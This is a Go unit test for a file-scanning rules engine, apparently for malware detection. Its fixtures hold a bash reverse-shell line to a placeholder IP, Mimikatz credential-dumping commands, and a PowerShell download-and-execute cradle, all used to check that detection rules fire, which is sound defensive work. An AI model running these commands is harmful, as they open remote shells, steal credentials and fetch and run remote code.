package rules

import "testing"

func TestBuiltinRules(t *testing.T) {
	eng, err := Load("") // built-ins only
	if err != nil {
		t.Fatal(err)
	}
	if eng.Count() == 0 {
		t.Fatal("no rules loaded")
	}

	cases := []struct {
		name    string
		file    string
		content string
		ent     float64
		want    string // rule name expected to fire, "" = expect none
	}{
		{"reverse shell", "x.sh", "foo\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", 5, "reverse_shell_bash"},
		{"mimikatz", "x.txt", "privilege::debug sekurlsa::logonpasswords", 5, "mimikatz"},
		{"ps cradle", "x.ps1", `IEX (New-Object Net.WebClient).DownloadString("http://e/x")`, 5, "powershell_download_cradle"},
		{"packed exe", "evil.exe", "MZ...........", 7.6, "packed_executable"},
		{"clean text", "notes.txt", "just my grocery list and some ideas", 4, ""},
		{"clean exe low entropy", "hello.exe", "MZ normal program", 5.0, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			hits := eng.Match(c.file, []byte(c.content), c.ent)
			if c.want == "" {
				if len(hits) != 0 {
					t.Fatalf("expected no hits, got %v", hits)
				}
				return
			}
			found := false
			for _, h := range hits {
				if h.Rule == c.want {
					found = true
				}
			}
			if !found {
				t.Fatalf("expected rule %q to fire, got %v", c.want, hits)
			}
		})
	}
}
